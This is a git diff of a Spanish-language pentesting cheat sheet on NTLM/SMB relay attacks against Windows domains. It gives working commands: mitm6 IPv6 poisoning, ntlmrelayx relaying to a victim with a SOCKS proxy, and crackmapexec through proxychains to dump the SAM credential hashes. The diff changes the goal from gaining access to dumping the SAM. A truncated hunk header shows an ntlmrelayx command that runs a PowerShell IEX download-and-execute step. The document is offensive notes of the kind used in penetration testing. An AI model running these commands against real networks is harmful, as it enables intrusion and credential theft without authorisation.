@@ -51,7 +51,7 @@ ntlmrelayx.py -tf <targets.txt> -smb2support -c "powershell IEX(New-Object Net.W
 
 # Ejecutar comandos mediante un SMB Relay por IPv6
 Primero envenenamos el dominio con `mitm6` para luego entrar en una sesión interactiva con `ntlmrelayx` y mediante el comando `socks` podremos ver las conexiones y el `AdminStatus` de los usuarios. En el caso de obtener un usuario con `AdminStatus True` podremos  añadir en la sección `[ProxyList]` de proxychains `socks4 127.0.0.1 1080`
-y luego ejecutar cme con proxychains y ganaremos acceso al sistema sin saber la contraseña.
+y luego ejecutar cme con proxychains y dumpear la SAM del equipo sin saber la contraseña.
 ```
 mitm6 -d <dominio>
 ```
@@ -59,6 +59,6 @@ mitm6 -d <dominio>
 ntlmrelayx.py -6 -wh <ip_atacante> -t smb://<ip_victima> -socks -debug -smb2support
 ```
 ```
-proxychains cme smb <ip_victima> -u 'usuario' -d 'NombreDelDominio' -p 'daigual'
+proxychains cme smb <ip_victima> -u 'usuario' -p 'daigual' -d 'NombreDelDominio' --sam 2>/dev/null
 ```
 
